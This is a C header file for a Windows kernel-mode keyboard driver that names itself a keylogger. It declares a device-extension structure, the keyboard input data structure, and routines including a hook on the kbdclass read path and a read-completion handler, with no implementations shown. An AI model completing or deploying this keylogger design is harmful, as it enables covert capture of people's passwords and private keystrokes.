#ifndef _KeyLoger_h_
#define _KeyLoger_h_

typedef struct _DevExt_ {
    PDRIVER_OBJECT pDrvObj;

    PDEVICE_OBJECT pCurDev;

    PDEVICE_OBJECT pTargetDev;

    ULONG numPendingIrps;

} DevExt, *PDevExt;

typedef struct _KEYBOARD_INPUT_DATA {

    //
    // Unit number.  E.g., for \Device\KeyboardPort0 the unit is '0',
    // for \Device\KeyboardPort1 the unit is '1', and so on.
    //

    USHORT UnitId;

    //
    // The "make" scan code (key depression).
    //

    USHORT MakeCode;

    //
    // The flags field indicates a "break" (key release) and other
    // miscellaneous scan code information defined below.
    //

    USHORT Flags;

    USHORT Reserved;

    //
    // Device-specific additional information for the event.
    //

    ULONG ExtraInformation;

} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;

#define KEY_MAKE 0
#define KEY_BREAK 1

void KeylogerUnload(IN PDRIVER_OBJECT DriverObject);

NTSTATUS HookKbdclassRead(PDRIVER_OBJECT DriverObject);

NTSTATUS KeylogerDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

NTSTATUS KeylogerRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

NTSTATUS KeylogerPower(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

NTSTATUS
ReadCompleteRoutine(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  Irp,
    IN PVOID  Context
);

#endif